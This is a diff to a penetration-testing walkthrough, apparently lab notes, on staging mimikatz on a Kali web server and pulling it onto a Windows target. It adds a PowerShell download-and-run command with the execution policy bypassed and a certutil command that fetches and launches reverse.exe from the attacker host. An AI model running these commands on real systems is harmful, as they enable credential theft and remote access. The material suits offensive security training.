@@ -92,22 +92,35 @@ Nmap done: 3 IP addresses (3 hosts up) scanned in 342.02 seconds
 
 # 1. Cached Credential Storage and Retrieval
 
-**On Kali:** Setup web server to host `mimikatz`
+**On Kali:** Prepare web server for `mimikatz` download
+
+Prepare files to web server root
+
+☝️ Apache2 is already running with DocumentRoot at `/var/www/html`
+
+If Kali isn't setup as web server, use `python3 -m http.server 80 &> /dev/null &` to run a web server endpoint, the web server root will be the `pwd` where the command was run
 
 ```console
-cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
-sudo python3 -m http.server 80 &> /dev/null &
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
 ```
 
 **On Target:** Download and run `mimikatz`
+
+Option 1: PowerShell
 
 - Download: `(New-Object System.Net.WebClient).DownloadFile()`
 - Run: `Start-Process`
 
 ```console
 set SRC_URL=http://kali.vx/mimikatz.exe
-set DST_PATH=%USERPROFILE%\mimikatz.exe
+set DST_PATH=%TEMP%\mimikatz.exe
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile($env:SRC_URL,$env:DST_PATH); Start-Process $env:DST_PATH
+```
+
+Option 2: certutil
+
+```console
+certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %TEMP%\reverse.exe && %TEMP%\reverse.exe
 ```
 
 **On Target:** mimikatz commands
